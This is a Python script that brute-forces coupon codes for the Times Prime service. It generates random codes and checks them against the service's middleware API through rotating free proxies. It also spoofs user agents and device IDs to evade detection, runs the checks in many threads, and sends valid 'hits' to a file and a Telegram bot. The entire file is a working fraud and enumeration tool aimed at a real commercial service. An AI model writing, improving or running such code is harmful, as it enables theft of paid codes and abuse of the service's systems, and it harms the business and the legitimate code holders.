import random
import string
import requests
import concurrent.futures
import time
import telebot

GREEN = '\033[92m'  # Green
RED = '\033[91m'    # Red

# Function to get proxies from the API
def get_proxies():
    proxy_url = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
    proxies = requests.get(proxy_url).text.split()
    return proxies

# Function to make a request with a random proxy
def make_request_with_proxy(url, headers):
    proxy = {"http": f'http://{random.choice(proxies)}', 'https': f'http://{random.choice(proxies)}'}
    response = requests.get(url, headers=headers, proxies=proxy)
    return response

def device_id():
    unique_id = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    timestamp = str(int(time.time()))
    return f"{unique_id}-{timestamp}"

def generate_coupon(pattern="TPVSXXXXXXXXXX"):
    coupon = "".join(random.choice(string.ascii_uppercase + string.digits) if char == 'X' else char for char in pattern)
    return coupon

def random_ua():
    android_versions = ["Android 10", "Android 11", "Android 12"]
    ios_versions = ["iOS 14", "iOS 15"]
    windows_versions = ["Windows 10", "Windows 11"]
    mac_versions = ["Macintosh; Intel Mac OS X 10_15", "Macintosh; Intel Mac OS X 10_16"]

    android_ua = f"Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 90)}.0.4430.210 Mobile Safari/537.36"
    ios_ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.choice(ios_versions)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(12, 14)}.0 Mobile/15E148 Safari/604.1"
    windows_ua = f"Mozilla/5.0 (Windows NT {random.choice(windows_versions)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 90)}.0.4430.210 Safari/537.36"
    mac_ua = f"Mozilla/5.0 ({random.choice(mac_versions)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 90)}.0.4430.210 Safari/537.36"

    ua_list = [android_ua, ios_ua, windows_ua, mac_ua]
    return random.choice(ua_list)

def tp_code_checker(code):
    did = device_id()
    rid = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    url = f"https://middleware.timesprime.com/mw/concurrent/v1/codeDetails/{code}?cid=TIMES_PRIME&pid=WEB&rid={rid}&deviceId={did}"
    headers = {
        "Origin": "https://www.timesprime.com",
        "Referer": "https://www.timesprime.com/",
        "user-agent": random_ua()
    }
    
    # Make the request using a random proxy
    response = make_request_with_proxy(url, headers)
    
    try:
        rjson = response.json()
        return rjson
    except:
        return {
            "responseMessage": response.text,
            "success": False,
            "code": code
        }

def send_telegram_message(token, chat_id, message):
    bot = telebot.TeleBot(token)
    bot.send_message(chat_id, message)

def main(threads_limit, save_in_file="codes.txt", telegram_token=None, telegram_chat_id=None):
    def generate_coupons():
        for _ in range(100):
            code = generate_coupon()
            rjson = tp_code_checker(code)
            success = rjson['success']
            msg = f"\nCode = {code}\nSuccess = {success}\nMsg = {rjson['responseMessage']}"
            if success:
                print(f"{GREEN}Yahooo! | Hitted = {code}")

                with open(save_in_file, "a", encoding="utf-8") as file:
                    file.write(code + "\n")

                if telegram_token and telegram_chat_id:
                    send_telegram_message(telegram_token, telegram_chat_id, f"Yahooo! | Hitted = {code}")
            else:
                print(f"{RED}{msg}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads_limit) as executor:
        futures = [executor.submit(generate_coupons) for _ in range(threads_limit)]

if __name__ == "__main__":
    threads_limit = int(input("Enter the number of threads: "))
    telegram_token = input("Enter your Telegram bot token: ")
    telegram_chat_id = input("Enter your Telegram chat ID: ")
    proxies = get_proxies()
    main(threads_limit, telegram_token=telegram_token, telegram_chat_id=telegram_chat_id)
